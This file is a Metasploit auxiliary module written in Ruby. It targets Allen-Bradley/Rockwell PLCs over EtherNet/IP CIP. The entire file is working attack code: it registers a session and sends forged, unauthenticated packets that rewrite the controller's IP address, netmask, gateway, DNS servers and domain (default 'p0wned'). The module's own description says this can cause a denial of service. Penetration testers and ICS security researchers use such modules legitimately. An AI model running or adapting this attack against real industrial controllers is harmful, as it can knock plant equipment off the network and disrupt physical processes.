##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Rex::Socket::Tcp
  include Rex::Text

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Allen-Bradley/Rockwell Automation EtherNet/IP CIP Change IP Configuration',
      'Description'    => %q{
        The EtnerNet/IP CIP protocol allows a number of unauthenticated commands to a PLC which
        implements the protocol.  This module implements changing the Ethernet settings, potentially
        resulting in a DOS condition

        This module is based on the original 'ethernetip-multi.rb' Basecamp module
        from DigitalBond, and the multi_cip_command module.
      },
      'Author'         =>
        [
          'Ruben Santamarta <ruben[at]reversemode.com>',
          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
          'todb', # Metasploit fixups
          'SeawolfRN' # IP Configuration
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ],
          [ 'URL', 'http://reversemode.com/downloads/logix_report_basecamp.pdf']
        ],
      'DisclosureDate' => 'Jan 19 2012'))

    register_options(
      [
        Opt::RPORT(44818),
        OptString.new("NEWIP", [true, "New Target IP","192.168.0.50"]),
        OptString.new("NETMASK",[true,"New network mask","255.255.255.0"]),
        OptString.new("GATEWAY",[true,"New Gateway","192.168.0.1"]),
        OptString.new("NEWDNS1",[true,"New DNS 1","0.0.0.0"]),
        OptString.new("NEWDNS2",[true,"New DNS 2","0.0.0.0"]),
        OptString.new("DOMAIN",[true,"New Domain","p0wned"]),


        #How the bloody hell do I validate these in metasploit...
        
      ], self.class
    )
  end

  def run
    print_status "#{rhost}:#{rport} - CIP - Modifying IP Configuration"
    payload()
    sid = req_session

    if sid
      forge_packet(sid, payload())
      print_status "#{rhost}:#{rport} - CIP - attack complete."
    end
  end

  def forge_packet(sessionid, payload)
    packet = ""
    packet += "\x6f\x00" # command: Send request/reply data
    packet += [payload.size - 0x10].pack("v") # encap length (2 bytes)
    packet += [sessionid].pack("N") # session identifier (4 bytes)
    packet += payload #payload part
    begin
      sock.put(packet)
    rescue ::Interrupt
      print_error("#{rhost}:#{rport} - CIP - Interrupt during payload")
      raise $!
    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
      print_error("#{rhost}:#{rport} - CIP - Network error during payload")
      return nil
    end
  end

  def req_session
    begin
      connect
      packet = ""
      packet += "\x65\x00" # ENCAP_CMD_REGISTERSESSION (2 bytes)
      packet += "\x04\x00" # encaph_length (2 bytes)
      packet += "\x00\x00\x00\x00" # session identifier (4 bytes)
      packet += "\x00\x00\x00\x00" # status code (4 bytes)
      packet += "\x00\x00\x00\x00\x00\x00\x00\x00" # context information (8 bytes)
      packet += "\x00\x00\x00\x00" # options flags (4 bytes)
      packet += "\x01\x00" # proto (2 bytes)
      packet += "\x00\x00" # flags (2 bytes)
      sock.put(packet)
      response = sock.get_once
      if response
        session_id = response[4..8].unpack("N")[0] rescue nil# bare minimum of parsing done
        if session_id
          print_status("#{rhost}:#{rport} - CIP - Got session id: 0x"+session_id.to_s(16))
        else
          print_error("#{rhost}:#{rport} - CIP - Got invalid session id, aborting.")
          return nil
        end
      else
        raise ::Rex::ConnectionTimeout
      end
    rescue ::Interrupt
      print_error("#{rhost}:#{rport} - CIP - Interrupt during session negotation")
      raise $!
    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused => e
      print_error("#{rhost}:#{rport} - CIP - Network error during session negotiation: #{e}")
      return nil
    end
    return session_id
  end

  def cleanup
    disconnect rescue nil
  end

  def byte_encode(datasrc)
    ip = ""
    datastore[datasrc].split('.').each do |sect|
      if Integer(sect) > 255
        #except - fail
      end
      ip << Integer(sect)#.to_s(16)
    end
    return ip
  end

  def payload()
    #Byte Convert ip addresses to hex
    ip = byte_encode('NEWIP')
    netmask = byte_encode('NETMASK')
    gateway = byte_encode('GATEWAY')
    dns1 = byte_encode("NEWDNS1")
    dns2 = byte_encode("NEWDNS2")
    domain = "\x06\x00" + datastore['DOMAIN'] #Doesn't need converting?
    payload = "\x00\x00\x00\x00\x00\x04\x02\x00\x00\x00\x00\x00\xb2\x00\x24\x00" + #encapsulation -[payload.size-0x10]
    "\x10\x03\x20\xf5\x24\x01\x30\x05" 
    payload << ip
    payload << netmask
    payload << gateway
    payload << dns1
    payload << dns2
    payload << domain
  #TEST DEBUG
    print_status("Payload: #{payload}")
  #ENDTEST
    return payload
  end

end